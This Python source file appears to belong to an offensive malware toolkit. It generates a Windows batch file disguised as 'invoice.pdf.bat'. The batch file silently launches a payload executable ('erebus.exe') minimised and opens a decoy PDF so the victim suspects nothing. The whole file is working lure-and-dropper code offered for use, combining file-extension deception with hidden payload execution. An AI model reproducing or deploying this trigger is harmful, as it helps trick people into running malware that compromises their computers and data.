import pathlib
import sys
import os

REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
AGENT_CODE = REPO_ROOT / "agent_code"
PAYLOAD_DIR = AGENT_CODE / "payload"
DECOY_FILE = AGENT_CODE / "decoys" / "decoy.pdf"

def create_bat_trigger(
    payload_exe: str,
    decoy_file: str,
    payload_dir: pathlib.Path = None,
    output_filename: str = "invoice.pdf.bat"
) -> pathlib.Path:
    """Create a BAT trigger file in the payloads directory

    Args:
        payload_exe (str): Name of the payload executable (e.g., "erebus.exe")
        decoy_file (str): Name of the decoy file (e.g., "decoy.pdf")
        payload_dir (pathlib.Path): Directory where payload files are stored
        output_filename (str): Output BAT filename (default: invoice.pdf.bat)

    Returns:
        pathlib.Path: Path to the created BAT file
    """
    if payload_dir is None:
        payload_dir = PAYLOAD_DIR

    bat_output_path = payload_dir / output_filename
    payload_exe_win = str(payload_exe).replace('/', '\\')
    decoy_file_win = str(decoy_file).replace('/', '\\')

    bat_content = []
    bat_content.append("@echo off")
    bat_content.append('echo %cmdcmdline% | find /i "%~f0" >nul || exit')
    bat_content.append(f'start "" /min "{payload_exe_win}" >nul 2>&1')
    bat_content.append(f'start "" "{decoy_file_win}"')
    bat_content.append("exit")

    with open(bat_output_path, 'w', newline='\r\n') as f:
        f.write('\n'.join(bat_content))

    return bat_output_path

def create_bat_payload_trigger(
    payload_exe: str = "erebus.exe",
    payload_dir: pathlib.Path = None,
    decoy_file: pathlib.Path = None,
) -> pathlib.Path:

    if decoy_file is None:
        decoy_file = DECOY_FILE

    decoy_filename = decoy_file.name

    return create_bat_trigger(
        payload_exe=payload_exe,
        decoy_file=decoy_filename,
        payload_dir=payload_dir
    )